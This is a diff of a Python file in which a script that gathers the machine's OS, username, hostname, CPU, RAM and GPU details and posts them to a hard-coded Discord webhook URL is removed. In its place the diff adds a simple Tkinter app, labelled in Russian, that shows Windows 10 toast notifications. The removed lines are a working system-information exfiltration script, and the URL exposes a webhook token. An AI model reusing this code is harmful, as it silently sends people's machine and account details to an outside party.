@@ -1,27 +1,40 @@
-import requests
-import platform
-import socket
-import getpass
-import psutil
-import GPUtil
+import tkinter as tk
+from tkinter import messagebox
+from win10toast import ToastNotifier
 
-url = 'https://discord.com/api/webhooks/1387175086167167256/7-HwZRGSjupcQQVb2gnAqQQj3ctW8C-rHMzyjuQgDXKOeMUzCXvKV1dVYBAJ3ZsdV3h6'
+def show_notification():
+    user_input = entry.get()
+    if user_input.strip() == "":
+        messagebox.showwarning("Предупреждение", "Пожалуйста, введите текст для уведомления!")
+    else:
+        # Создаем объект для уведомлений
+        toaster = ToastNotifier()
+        # Показываем уведомление
+        toaster.show_toast(
+            "Уведомление",  # Заголовок
+            user_input,    # Текст уведомления
+            duration=5,     # Длительность отображения (в секундах)
+            threaded=True   # Потоковое уведомление (не блокирует программу)
+        )
+        # Очищаем поле ввода
+        entry.delete(0, tk.END)
 
-os_info = platform.platform()
-username = getpass.getuser()
-hostname = socket.gethostname()
-cpu = platform.processor()
-ram = round(psutil.virtual_memory().total / (1024**3), 2)
+# Создаем главное окно
+root = tk.Tk()
+root.title("Уведомления в Windows 10")
+root.geometry("400x200")
 
-gpus = GPUtil.getGPUs()
-gpu_info = ', '.join([gpu.name for gpu in gpus]) if gpus else 'No GPU found'
+# Надпись
+label = tk.Label(root, text="Введите текст для уведомления:", font=("Arial", 12))
+label.pack(pady=10)
 
-message = f"""**System Info**
-OS: {os_info}
-Username: {username}
-PC Name: {hostname}
-CPU: {cpu}
-RAM: {ram} GB
-GPU: {gpu_info}"""
+# Поле ввода
+entry = tk.Entry(root, width=40, font=("Arial", 12))
+entry.pack(pady=10)
 
-requests.post(url, json={'content': message})
+# Кнопка для создания уведомления
+button = tk.Button(root, text="Показать уведомление", command=show_notification, font=("Arial", 12))
+button.pack(pady=20)
+
+# Запускаем главный цикл
+root.mainloop()
